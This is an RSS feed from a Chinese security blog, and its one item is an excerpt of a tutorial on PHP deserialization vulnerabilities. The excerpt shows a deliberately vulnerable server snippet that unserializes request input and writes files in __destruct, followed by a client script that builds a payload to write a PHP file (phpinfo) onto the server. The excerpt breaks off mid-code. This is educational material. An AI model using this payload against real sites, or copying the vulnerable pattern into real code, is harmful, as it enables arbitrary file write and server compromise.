<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>反序列化 on Reber&#39;s Blog</title>
    <link>http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html</link>
    <description>Recent content in 反序列化 on Reber&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Copyright &amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Mon, 25 Jul 2016 23:32:52 +0800</lastBuildDate>
    
	<atom:link href="http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>PHP反序列化漏洞</title>
      <link>http://wyb0.com/posts/php-deserialization-vulnerabilities.html</link>
      <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-deserialization-vulnerabilities.html</guid>
      <description>0x00 关于反序列化漏洞  序列化：使用函数serialize()可将实例序列化为字符串
反序列化：使用函数unserialize()可将序列化的字符串还原
若服务端有如下代码：
&amp;lt;?php class foo{ public $file = &amp;quot;test.txt&amp;quot;; public $data = &amp;quot;123456&amp;quot;; function __destruct(){ file_put_contents($this-&amp;gt;file,$this-&amp;gt;data); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize(base64_decode($d)); var_dump($tc); ?&amp;gt;  客户端可构造如下代码生成序列化后的字符串提交给服务端，
服务端就会生成文件xx.php，内容为&amp;lt;?php phpinfo(); ?&amp;gt;：
&amp;lt;?php class foo { public $ﬁle = &amp;quot;test.txt&amp;quot;; public $data = &amp;quot;123456&amp;quot;; function __destruct() { ﬁle_put_contents($this-&amp;gt;ﬁle, $this-&amp;gt;data); } } $f = new foo(); $f-&amp;gt;ﬁle = &amp;quot;xx.php&amp;quot;; $f-&amp;gt;data = &amp;quot;&amp;lt;?php phpinfo(); ?</description>
    </item>
    
  </channel>
</rss>